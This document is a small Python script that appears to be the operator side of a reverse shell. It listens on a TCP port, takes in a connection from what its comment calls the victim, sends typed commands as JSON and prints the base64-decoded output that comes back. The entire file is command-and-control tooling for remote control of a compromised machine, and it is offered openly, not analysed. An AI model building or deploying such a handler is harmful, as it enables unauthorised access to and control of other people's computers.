import socket
import json
import base64

def reliable_send(data): #send and recieve data as much as we want
    json_data=json.dumps(data)
    client.send(json_data.encode())

def reliable_recv():
       
 data = b""  # Initialize as bytes
     
 while True:
      try: 
                  
         data=data+client.recv(1024)
         json_message = data.decode() 
         data = json.loads(json_message)  # Parse the JSON message
         if 'data' in data:  # If the received JSON has a 'data' key
                    # Decode the Base64-encoded data
                    data['data'] = base64.b64decode(data['data']).decode()
         return data    
        
      except :
         continue
        
      

#client.send("Thank you for connecting".encode())

def shell(): #shell function
    while True:
        Message=input(" Enter text to send message to : " )
        #client.send(Message.encode())
        reliable_send(Message)
        if Message == ("q" or "Q"):
            break
        else:
            result=reliable_recv()
            print(result)




def server(): #client server connection
    global s
    global client
    global ip
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print("Socket successfully created")
    port = 54321

    s.bind(("127.0.0.1",port))  #IP address of victim 
    print("Socket binded to %s" %port)

    s.listen(5)
    print("Socket is listening")

    #while True:
    #Establish connection with client 
    client, ip =s.accept()
    print("Connected to " ,client)

server()
shell()
client.close()